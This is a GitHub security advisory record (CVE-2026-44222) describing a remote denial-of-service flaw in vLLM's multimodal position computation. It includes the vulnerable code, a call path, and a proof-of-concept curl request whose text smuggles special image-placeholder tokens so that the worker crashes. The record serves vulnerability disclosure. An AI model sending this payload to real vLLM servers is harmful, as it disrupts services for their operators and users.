{"credits": [{"type": "reporter", "user": {"avatar_url": "https://avatars.githubusercontent.com/u/69114599?v=4", "events_url": "https://api.github.com/users/wumingzhilian/events{/privacy}", "followers_url": "https://api.github.com/users/wumingzhilian/followers", "following_url": "https://api.github.com/users/wumingzhilian/following{/other_user}", "gists_url": "https://api.github.com/users/wumingzhilian/gists{/gist_id}", "gravatar_id": "", "html_url": "https://github.com/wumingzhilian", "id": 69114599, "login": "wumingzhilian", "node_id": "MDQ6VXNlcjY5MTE0NTk5", "organizations_url": "https://api.github.com/users/wumingzhilian/orgs", "received_events_url": "https://api.github.com/users/wumingzhilian/received_events", "repos_url": "https://api.github.com/users/wumingzhilian/repos", "site_admin": false, "starred_url": "https://api.github.com/users/wumingzhilian/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/wumingzhilian/subscriptions", "type": "User", "url": "https://api.github.com/users/wumingzhilian", "user_view_type": "public"}}], "cve_id": "CVE-2026-44222", "cvss": {"score": 6.5, "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"}, "cvss_severities": {"cvss_v3": {"score": 6.5, "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"}, "cvss_v4": {"score": 0.0, "vector_string": null}}, "cwes": [{"cwe_id": "CWE-129", "name": "Improper Validation of Array Index"}], "description": "## Summary
This report explains a Token Injection vulnerability in vLLM’s multimodal processing. Unauthenticated, text-only prompts that spell special tokens are interpreted as control. Image and video placeholder sequences supplied without matching data cause vLLM to index into empty grids during input-position computation, raising an unhandled IndexError and terminating the worker or degrading availability. Multimodal paths that rely on `image_grid_thw`/`video_grid_thw` are affected. Severity: High (remote DoS). Reproduced on vLLM 0.10.0 with Qwen2.5-VL.

## Details
- Affected component: multimodal input position computation.
- File/functions (paths are indicative):
  - vllm/model_executor/layers/rotary_embedding.py
    - get_input_positions_tensor(...)
    - _vl_get_input_positions_tensor(...)
- Failure mechanism:
  - The code counts detected vision tokens and then indexes video_grid_thw/image_grid_thw accordingly.
  - When user input carries placeholder tokens but no actual multimodal payload, these grids are empty. The code does not bounds-check before indexing.

Representative snippet (context):
```python
# vllm/model_executor/layers/rotary_embedding.py
@classmethod
def _vl_get_input_positions_tensor(
    cls,
    input_tokens,
    hf_config,
    image_grid_thw,
    video_grid_thw,
    ...,
):
    # detect video tokens
    video_nums = (vision_tokens == video_token_id).sum()
    # later in processing
    t, h, w = (
        video_grid_thw[video_index][0],  # IndexError if no video data
        video_grid_thw[video_index][1],
        video_grid_thw[video_index][2],
    )
```

Abbreviated call path:
```
OpenAI API request
 → vllm.v1.engine.core: step/execute_model
 → vllm.v1.worker.gpu_model_runner: _update_states/execute_model
 → vllm.model_executor.layers.rotary_embedding: get_input_positions_tensor
 → _vl_get_input_positions_tensor
 → IndexError: list index out of range
```

## PoC
### Environment
- vLLM: 0.10.0
- Model: Qwen/Qwen2.5-VL-3B-Instruct
- Launch server:
```bash
python -m vllm.entrypoints.openai.api_server \
  --model Qwen/Qwen2.5-VL-3B-Instruct \
  --port 8000
```

### Request (text-only, no image/video data)
```bash
cat > request.json <<'JSON'
{
  "model": "Qwen/Qwen2.5-VL-3B-Instruct",
  "messages": [
    {
      "role": "user",
      "content": [
        { "type": "text",
          "text": "what's in picture <|vision_start|><|image_pad|><|vision_end|>" }
      ]
    }
  ]
}
JSON

curl -s http://127.0.0.1:8000/v1/chat/completions \
  -H 'Content-Type: application/json' \
  --data @request.json
```

### Observed result
- HTTP 500; logs show IndexError: list index out of range from _vl_get_input_positions_tensor(...).
- In some deployments, the worker exits and capacity remains reduced until manual restart.

## Impact
- Type: Token Injection leading to Remote Denial of Service (unauthenticated). A single request can trigger the fault.
- Scope: Any vLLM deployment that serves VLMs and accepts raw user text via OpenAI-compatible endpoints (self-hosted or proxied/managed fronts).
- Effect: Request → unhandled exception in position computation → worker termination / service unavailability.

## Fixes

* Changes associated with https://github.com/vllm-project/vllm/issues/32656

## Credits
Pengyu Ding (Infra Security, Ant Group)  
Ziteng Xu (Infra Security, Ant Group)", "epss": {"percentage": 0.00414, "percentile": 0.33508}, "ghsa_id": "GHSA-hpv8-x276-m59f", "github_reviewed_at": "2026-05-05T22:21:41Z", "html_url": "https://github.com/advisories/GHSA-hpv8-x276-m59f", "identifiers": [{"type": "GHSA", "value": "GHSA-hpv8-x276-m59f"}, {"type": "CVE", "value": "CVE-2026-44222"}], "nvd_published_at": "2026-05-12T20:16:43Z", "published_at": "2026-05-05T22:21:41Z", "references": ["https://github.com/vllm-project/vllm/security/advisories/GHSA-hpv8-x276-m59f", "https://github.com/vllm-project/vllm/issues/32656", "https://nvd.nist.gov/vuln/detail/CVE-2026-44222", "https://github.com/advisories/GHSA-hpv8-x276-m59f", "https://github.com/pypa/advisory-database/tree/main/vulns/vllm/PYSEC-2026-3409.yaml", "https://github.com/vllm-project/vllm", "https://pypi.org/project/vllm"], "repository_advisory_url": "https://api.github.com/repos/vllm-project/vllm/security-advisories/GHSA-hpv8-x276-m59f", "severity": "medium", "source_code_location": "https://github.com/vllm-project/vllm", "summary": "vLLM Vulnerable to Remote DoS via Special-Token Placeholders", "type": "reviewed", "updated_at": "2026-07-17T16:21:20Z", "url": "https://api.github.com/advisories/GHSA-hpv8-x276-m59f", "vulnerabilities": [{"first_patched_version": "0.20.0", "package": {"ecosystem": "pip", "name": "vllm"}, "vulnerable_functions": [], "vulnerable_version_range": ">= 0.6.1, < 0.20.0"}], "withdrawn_at": null}

title: vLLM Vulnerable to Remote DoS via Special-Token Placeholders
